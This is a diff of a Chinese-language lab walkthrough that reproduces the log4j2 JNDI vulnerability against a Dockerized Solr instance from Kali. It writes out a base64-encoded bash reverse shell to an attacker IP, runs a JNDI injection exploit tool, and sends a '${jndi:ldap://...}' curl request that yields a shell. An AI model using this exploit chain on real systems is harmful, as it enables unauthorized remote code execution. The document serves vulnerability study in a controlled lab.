@@ -64,7 +64,8 @@ LDAP 是一套轻量级目录访问协议, 其作用类似电话簿, LDAP 支持
 
 ### log4j2 漏洞复现
 
-#### 启动靶机
+#### 扫描连接
+
 
 开启靶机端口映射, 这样 kali 才能访问对应端口:
 
@@ -72,27 +73,90 @@ LDAP 是一套轻量级目录访问协议, 其作用类似电话簿, LDAP 支持
 docker run -d -p 8983:8983 --name log4j2 sha256:052794134d434bc2db0775211589beb372412af333a262dbf7977d28ec8d2142
 ```
 
-在 kali 中用 telnet 尝试连接:
+用 nmap 初步扫一下:
 
 ![2-1.png](2-1.png)
+
+![2-2.png](2-2.png)
+
+访问一下网页:
+
+![2-3.png](2-3.png)
+
+在 kali 中用 telnet 尝试连接:
+
 
 #### 构造 payload
 
 首先对 shellcode 作 base64 编码:
 
 ```bash
-echo "bash -i >& /dev/tcp/192.168.170.135/4444 0>&1" | base64
+# `192.168.170.145` 为攻击机地址:
+echo "bash -i >& /dev/tcp/192.168.170.145/4444 0>&1" | base64
 ```
 
-启动 JNDI 攻击工具:
+![3-1.png](3-1.png)
+
+JNDI 攻击工具需要 Java 8 环境:
+
+> kali 不自带 java 8 环境, 具体安装和多版本切换: [CSDN博客](https://blog.csdn.net/2301_79518550/article/details/147173477)
+> ```bash
+> # 注册 Java 和 Javac 命令
+> sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_202/bin/java" 0
+> sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_202/bin/javac" 0
+> # 设置默认 Java 版本
+> sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_202/bin/java
+> sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_202/bin/javac
+> ```
+
+确认一下 Java 当前版本:
+
+> 项目地址: [Github](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)
+
+![3-2.png](3-2.png)
+
+然后启动这个 JNDI 注入项目:
 
 ```bash
-java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
--C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3MC4xMzUvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" \
--A 192.168.170.135
-```
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3MC4xNDUvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" -A 192.168.170.145 
 
+```
 > `-C`: Base64 编码的反弹 Shell 命令。
 > `-A`: 地址, 攻击机 kali 的 ip 。
-> 输出为payload: `ldap://192.168.170.135:port/Exploit`
+> 输出为payload: `ldap://192.168.170.145:port/Exploit`
 
+![3-3.png](3-3.png)
+
+`JNDI Links` 中显示的就是利用(Exploit)。
+
+#### 查找 Solr 服务
+
+查看所有 core（核心）名称:
+
+```bash
+sudo curl 'http://192.168.170.1:8983/solr/admin/cores?action=STATUS&wt=json'
+```
+
+![4-1.png](4-1.png)
+
+可见有一个名为 demo 的接口, 接下来只需要使用这个接口, 让其把 URL 或参数写入日志, 就会触发 JNDI。
+
+#### 触发漏洞
+
+在 kali 上启动端口 4444 的监听, 然后就可以触发这个利用了:
+
+```bash
+curl -G \
+  --data-urlencode "q=\${jndi:ldap://192.168.170.145:1389/evbn4l}" \
+  "http://192.168.170.1:8983/solr/demo/select?wt=json"
+```
+
+> 用 `--data-urlencode` 可以让浏览器地址栏自动对某些字符编码, 确保参数准确传到服务器上。
+
+![4-3.png](4-3.png)
+
+![4-2.png](4-2.png)
+
+kali 上已经收到了反弹shell, 至此 log4j2 复现完毕。
+
+~「务必在受控环境中测试，切勿在生产环境随意执行」~
